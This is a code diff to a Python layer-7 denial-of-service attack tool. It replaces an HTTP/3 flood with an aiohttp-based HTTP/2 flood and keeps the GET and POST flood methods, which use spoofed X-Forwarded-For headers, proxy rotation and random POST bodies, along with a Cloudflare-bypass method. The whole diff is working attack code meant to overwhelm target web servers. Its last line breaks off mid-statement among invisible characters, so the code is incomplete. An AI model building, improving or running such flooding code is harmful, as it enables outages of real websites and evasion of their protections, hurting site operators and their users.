@@ -4,10 +4,11 @@ from threading import Thread, Event
 from time import time, sleep
 import random
 from urllib.parse import urlparse
-from hyper import HTTPConnection
 from cloudscraper import create_scraper
 import psutil
 import ssl
+import aiohttp
+from contextlib import suppress
 from utils import randbytes, humanbytes
 
 class AttackBase(Thread):
@@ -103,11 +104,11 @@ class Layer7Attack(AttackBase):
     async def run(self):
         self.event.wait()
         end_time = time() + self.duration
-        parsed = urlparse(self.target)
-        self.host = parsed.hostname
-        self.port = parsed.port or (443 if parsed.scheme == "https" else 80)
+        self.parsed = urlparse(self.target)
+        self.host = self.parsed.hostname
+        self.port = self.parsed.port or (443 if self.parsed.scheme == "https" else 80)
         methods = {
-            "HTTP3": self.http3_flood,
+            "HTTP2": self.http2_flood,  # Thay HTTP3 bằng HTTP/2 với aiohttp
             "GET": self.http_get,
             "POST": self.http_post,
             "CFB": self.cloudflare_bypass
@@ -119,38 +120,46 @@ class Layer7Attack(AttackBase):
             logger.error(f"Method {self.method} not supported.")
 
     async def http_get(self):
-        headers = "\r\n".join([
-            f"User-Agent: {random.choice(['Mozilla/5.0', 'Chrome/90.0'])}",
-            f"X-Forwarded-For: {'.'.join(str(random.randint(1, 255)) for _ in range(4))}"
-        ])
+        headers = {
+            "User-Agent": random.choice(['Mozilla/5.0', 'Chrome/90.0']),
+            "X-Forwarded-For": '.'.join(str(random.randint(1, 255)) for _ in range(4))
+        }
         with suppress(Exception):
-            sock, proxy = self.get_socket(parsed.scheme == "https")
+            sock, proxy = self.get_socket(self.parsed.scheme == "https")
             target = (proxy.ip, proxy.port) if proxy else (self.host, self.port)
             sock.connect(target)
-            payload = f"GET {parsed.path or '/'} HTTP/1.1\r\nHost: {self.host}\r\n{headers}\r\n\r\n".encode()
-            sent = sock.send(payload)
+            payload = f"GET {self.parsed.path or '/'} HTTP/1.1\r\nHost: {self.host}\r\n" + \
+                      "\r\n".join(f"{k}: {v}" for k, v in headers.items()) + "\r\n\r\n"
+            sent = sock.send(payload.encode())
             self.bytes_sent += sent
             self.requests_sent += 1
             sock.close()
 
     async def http_post(self):
         with suppress(Exception):
-            sock, proxy = self.get_socket(parsed.scheme == "https")
+            sock, proxy = self.get_socket(self.parsed.scheme == "https")
             target = (proxy.ip, proxy.port) if proxy else (self.host, self.port)
             sock.connect(target)
-            payload = f"POST {parsed.path or '/'} HTTP/1.1\r\nHost: {self.host}\r\nContent-Length: 4096\r\n\r\n{randbytes(4096).decode('latin1')}".encode()
-            sent = sock.send(payload)
+            payload = f"POST {self.parsed.path or '/'} HTTP/1.1\r\nHost: {self.host}\r\nContent-Length: 4096\r\n\r\n{randbytes(4096).decode('latin1')}"
+            sent = sock.send(payload.encode())
             self.bytes_sent += sent
             self.requests_sent += 1
             sock.close()
 
-    async def http3_flood(self):
+    async def http2_flood(self):
+        headers = {
+            "User-Agent": "Mozilla/5.0",
+            ":method": "GET",
+            ":path": self.parsed.path or "/",
+            ":authority": self.host
+        }
         with suppress(Exception):
-            conn = HTTPConnection(f"{self.host}:{self.port}", enable_push=False)
-            conn.request("GET", parsed.path or "/", headers={"User-Agent": "Mozilla/5.0"})
-            resp = conn.get_response()
-            self.bytes_sent += len(resp.read())
-            self.requests_sent += 1
+            proxy = random.choice(self.proxies) if self.proxies else None
+            proxy_url = f"http://{proxy}" if proxy else None
+            async with aiohttp.ClientSession() as session:
+                async with session.get(self.target, headers=headers, proxy=proxy_url) as resp:
+                    self.bytes_sent += len(await resp.read())
+                    self.requests_sent += 1
 
     async def cloudflare_bypass(self):
         with suppress(Exception):
@@ -158,5 +167,4 @@ class Layer7Attack(AttackBase):
             proxy = random.choice(self.proxies) if self.proxies else None
             proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
             resp = scraper.get(self.target, proxies=proxy_dict)
-            self.bytes_sent += len(resp.request.body or b"")
-            self.requests_sent += 1
+            self.bytes_sent +=​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​
